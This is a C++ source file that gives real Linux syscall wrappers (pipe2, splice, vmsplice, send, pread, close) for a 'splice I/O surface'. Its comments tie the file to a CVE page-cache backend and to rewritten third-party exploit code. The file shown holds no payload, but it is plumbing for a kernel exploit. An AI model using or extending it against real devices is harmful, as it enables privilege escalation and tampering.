/* B5-3 device binding for the injectable splice surface (splice_io.hpp).
 *
 * Android/Linux only; any other host gets an all-null surface so the module
 * still links and available() stays false. Host tests bind their own fake.
 *
 * Mapping to third_party/dirtyfrag/usermode/ankit/exp.c (do_one_write_cbc) and
 * dirtyinit/dfi_exploit.c (do_cbc_block_splice) plus
 * lspromise/splicehelper.c. The upstream repositories ship no LICENSE, so this
 * is an independent rewrite with attribution. */

#include "backend/cve_2026_43284/pagecache/splice_io.hpp"

#include <cerrno>
#include <cstddef>
#include <cstdint>

#if defined(__linux__)
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

namespace ghostlock::backend::cve_2026_43284::pagecache {
    namespace {
        int real_pipe2(int fds[2], int flags) noexcept {
            return ::pipe2(fds, flags) == 0 ? 0 : -errno;
        }

        long real_splice(int fd_in, const std::uint64_t *off_in, int fd_out,
                         const std::uint64_t *off_out, std::size_t len,
                         unsigned flags) noexcept {
            /* The interface treats the offsets as inputs; splice(2) updates
             * loff_t values, so copy them into locals first. */
            off64_t in_off = 0;
            off64_t out_off = 0;
            off64_t *in_ptr = nullptr;
            off64_t *out_ptr = nullptr;
            if (off_in != nullptr) {
                in_off = static_cast<off64_t>(*off_in);
                in_ptr = &in_off;
            }
            if (off_out != nullptr) {
                out_off = static_cast<off64_t>(*off_out);
                out_ptr = &out_off;
            }
            const ssize_t n = ::splice(fd_in, in_ptr, fd_out, out_ptr, len, flags);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_vmsplice(int fd, const std::uint8_t *data, std::size_t len,
                           unsigned flags) noexcept {
            struct iovec iov {};
            iov.iov_base = const_cast<std::uint8_t *>(data);
            iov.iov_len = len;
            const ssize_t n = ::vmsplice(fd, &iov, 1U, flags);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_send_datagram(int fd, const std::uint8_t *buf,
                                std::size_t len) noexcept {
            const ssize_t n = ::send(fd, buf, len, 0);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_read_at(int fd, std::uint8_t *out, std::size_t len,
                          std::uint64_t offset) noexcept {
            const ssize_t n = ::pread(fd, out, len, static_cast<off64_t>(offset));
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        int real_close_fd(int fd) noexcept {
            return ::close(fd) == 0 ? 0 : -errno;
        }
    } // namespace

    SpliceIoOps real_splice_io() noexcept {
        return SpliceIoOps{&real_pipe2, &real_splice, &real_vmsplice,
                           &real_send_datagram, &real_read_at, &real_close_fd};
    }
} // namespace ghostlock::backend::cve_2026_43284::pagecache

#else

namespace ghostlock::backend::cve_2026_43284::pagecache {
    SpliceIoOps real_splice_io() noexcept { return SpliceIoOps{}; }
} // namespace ghostlock::backend::cve_2026_43284::pagecache

#endif
